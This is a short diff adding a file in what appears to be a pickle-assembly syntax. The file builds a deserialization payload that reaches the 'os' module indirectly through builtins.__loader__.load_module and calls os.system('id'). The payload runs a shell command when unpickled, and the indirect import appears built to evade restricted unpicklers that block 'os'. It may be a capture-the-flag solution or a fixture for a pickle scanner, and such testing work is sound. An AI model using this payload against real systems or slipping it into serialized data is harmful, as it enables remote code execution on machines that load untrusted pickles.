@@ -1,0 +1,5 @@
+l = INST('builtins', '__loader__')
+getattr = GLOBAL('builtins', 'getattr')
+ld = getattr(l, 'load_module')
+getattr(ld('os'), 'system')('id')
+return
